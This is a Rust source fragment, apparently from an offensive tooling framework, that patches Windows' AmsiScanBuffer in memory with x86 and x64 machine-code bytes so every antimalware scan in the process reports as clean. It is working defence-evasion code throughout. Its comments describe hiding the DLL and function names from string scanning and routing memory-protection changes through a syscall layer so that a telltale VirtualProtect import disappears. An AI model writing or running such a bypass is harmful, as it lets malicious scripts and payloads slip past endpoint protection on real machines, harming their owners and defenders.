// --- AMSI patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

/// The bytes written over `AmsiScanBuffer`'s prologue.
///
/// It returns `S_OK` (`eax = 0`) *and* stores `AMSI_RESULT_CLEAN` (0) in the
/// sixth argument (the caller's `AMSI_RESULT*`), so a caller that reads the
/// result — `System.Management.Automation` does, on every script it compiles —
/// sees "clean" instead of uninitialized memory.
#[cfg(target_arch = "x86_64")]
const AMSI_PATCH: [u8; 11] = [
    0x29, 0xC0, // sub eax, eax
    0x4C, 0x8B, 0x54, 0x24, 0x30, // mov r10, [rsp+0x30]  (6th arg: AMSI_RESULT*)
    0x41, 0x89, 0x02, // mov [r10], eax
    0xC3, // ret
];

/// The 32-bit variant: the `AMSI_RESULT*` is the sixth stack argument and the
/// `stdcall` callee pops all six (24 bytes).
#[cfg(target_arch = "x86")]
const AMSI_PATCH: [u8; 11] = [
    0x31, 0xC0, // xor eax, eax
    0x8B, 0x54, 0x24, 0x18, // mov edx, [esp+0x18]  (6th arg: AMSI_RESULT*)
    0x89, 0x02, // mov [edx], eax
    0xC2, 0x18, 0x00, // ret 0x18
];

/// Errors produced while patching the scan function.
#[derive(Debug, thiserror::Error)]
pub enum PatchAmsiError {
    #[error("failed to load the library to patch")]
    LoadFailed,
    #[error("failed to resolve the function to patch")]
    ResolveFailed,
    #[error("failed to make the target function writable")]
    MakeWritableFailed,
    #[error("failed to restore the target function protection")]
    RestoreProtectionFailed,
}

/// Patches `AmsiScanBuffer` in the current process so it reports every scan as
/// clean.
///
/// The patch returns `S_OK` **and** stores `AMSI_RESULT_CLEAN` (0) in the
/// caller's out-parameter. Writing only `sub eax, eax; ret` leaves that
/// parameter untouched, and a caller that reads it (`System.Management.Automation`
/// does, on every script it compiles) then sees uninitialized memory — which
/// makes the scan result non-deterministic.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`. The page protection changes go through the
/// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
/// `VirtualProtect` import.
pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
    let dll_name: String = $AMSI_DLL_DEF$;
    let export_name: String = $AMSI_FUNC_DEF$;
    crate::tech_dbg!("patch_amsi", "patching {dll_name}!{export_name}");

    let amsi_dll = std::ffi::CString::new(dll_name).map_err(|_| PatchAmsiError::LoadFailed)?;
    let func_name = std::ffi::CString::new(export_name).map_err(|_| PatchAmsiError::LoadFailed)?;

    // 1. Load amsi.dll (a no-op if it is already loaded).
    let module = unsafe { LoadLibraryA(PCSTR(amsi_dll.as_ptr() as *const u8)) }
        .map_err(|_| PatchAmsiError::LoadFailed)?;

    // 2. Resolve AmsiScanBuffer.
    let address = unsafe { GetProcAddress(module, PCSTR(func_name.as_ptr() as *const u8)) };
    let address = address.ok_or(PatchAmsiError::ResolveFailed)?;
    let target = address as usize as *mut u8;
    crate::tech_dbg!("patch_amsi", "resolved target at {target:p}");

    // 3. Make the patch bytes writable. The patch is longer than a `ret`:
    //    besides returning `S_OK` it also writes `AMSI_RESULT_CLEAN` (0) to the
    //    caller's out-parameter, so a scan never reports uninitialized memory.
    let patch: &[u8] = &AMSI_PATCH;
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(PatchAmsiError::MakeWritableFailed);
    }

    // 4. Write the patch.
    unsafe {
        std::ptr::copy_nonoverlapping(patch.as_ptr(), target, patch.len());
    }

    // 5. Restore the original protection.
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err(PatchAmsiError::RestoreProtectionFailed);
    }
    crate::tech_dbg!(
        "patch_amsi",
        "wrote {} patch bytes and restored the original protection",
        patch.len()
    );

    // A Preparation always continues the pipeline; only the `bouncer` gate
    // decides to abort (see `techniques/README.md`).
    Ok(true)
}
